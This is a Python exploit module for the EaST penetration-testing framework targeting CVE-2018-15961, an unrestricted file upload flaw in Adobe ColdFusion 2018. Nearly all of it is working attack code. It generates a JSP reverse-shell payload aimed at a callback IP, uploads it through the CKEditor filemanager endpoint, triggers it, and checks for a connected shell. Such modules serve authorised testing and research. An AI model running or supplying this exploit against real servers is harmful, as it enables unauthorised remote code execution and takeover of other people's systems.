from Sploit import Sploit
from collections import OrderedDict
from Shellcodes import CrossOSShellcodes
from ShellUtils import Constants
import urllib2
from WebHelper import FormPoster

INFO = {}
INFO['NAME'] = "efa_adobe_coldfusion_2018_rce"
INFO['DESCRIPTION'] = "Adobe ColdFusion 2018 Remote Code Execution"
INFO['VENDOR'] = "https://www.adobe.com/ru/products/coldfusion-family.html"
INFO['CVE Name'] = "CVE-2018-15961"
INFO['NOTES'] = """Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability.
Successful exploitation could lead to arbitrary code execution.
"""
INFO['DOWNLOAD_LINK'] = "https://www.adobe.com/ru/products/coldfusion/download-trial/try.html"
INFO['LINKS'] = ["https://www.exploit-db.com/exploits/45979"]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = """Original exploit by Pete Freitag of Foundeo
EaST Framework module by Gleg Team"""

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57"
OPTIONS["PORT"] = 8500
OPTIONS["SSL"] = False
OPTIONS["CALLBACK_IP"] = '192.168.1.221'
OPTIONS["BASEPATH"] = '/'

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8500
        self.callback_ip = '127.0.0.1'
        self.protocol = 'http'
        self.basepath = '/'
        self.url = '{}://{}:{}{}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm'
        self.shell_url = '{}://{}:{}{}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{}.jsp'
        self.shell_name = self.random_string()

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.callback_ip = self.args.get("CALLBACK_IP", self.callback_ip)

        self.protocol = 'https' if self.args.get("SSL") else 'http'

        if self.basepath == '/':
            self.basepath = ''
        else:
            self.basepath = '/' + self.basepath.strip('/')

        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log('Please enable listener')
            self.finish('False')

        self.url = self.url.format(self.protocol, self.host, self.port, self.basepath)
        self.shell_url = self.shell_url.format(self.protocol, self.host, self.port, self.basepath, self.shell_name)

    def create_shellcode(self):
        s = CrossOSShellcodes(self.callback_ip, self.listener_port)
        shellcode = s.create_shellcode(Constants.ShellcodeType.JSP)
        return shellcode

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        shellcode = self.create_shellcode()
        form = FormPoster()
        form.add_file('file', self.shell_name + '.jsp', shellcode, False, 'multipart/form-data')
        form.add_field('path', 'shell')
        req = form.post(self.url)
        r = urllib2.urlopen(req)
        if not 'parent.fm.fmreturnhome()' in r.read():
            self.log('Failed to upload shell')
            self.finish(False)
        self.log('Shell uploaded')
        self.log('Triggering payload...')
        r = urllib2.urlopen(self.shell_url)
        if self.is_listener_connected():
            self.log('Succesfully got shell')
            self.finish(True)
        else:
            self.log('Failed to get shell')
            self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()